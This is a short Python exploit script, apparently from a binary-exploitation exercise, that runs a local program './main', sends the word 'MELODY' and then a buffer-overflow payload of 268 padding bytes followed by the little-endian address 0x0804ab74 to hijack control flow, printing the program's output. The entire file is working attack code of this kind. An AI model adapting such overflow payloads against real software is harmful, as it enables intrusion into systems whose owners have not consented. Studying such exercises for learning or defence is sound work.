import subprocess, os
os.environb.get(b'EGG')
p = subprocess.Popen(['./main'],stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
#0x0804ab74
#0804ab74
l = ['MELODY\n'.encode('utf8'),b"*" * (256 + 12) + b"\x74\xab\x04\x08" + b"\n"]
sout, serr = p.communicate(input=b"".join(l))
print('STDOUT: ' + str(sout,encoding="utf8"))
print('STDERR: ' + str(serr,encoding="utf8"))
print(p.returncode)
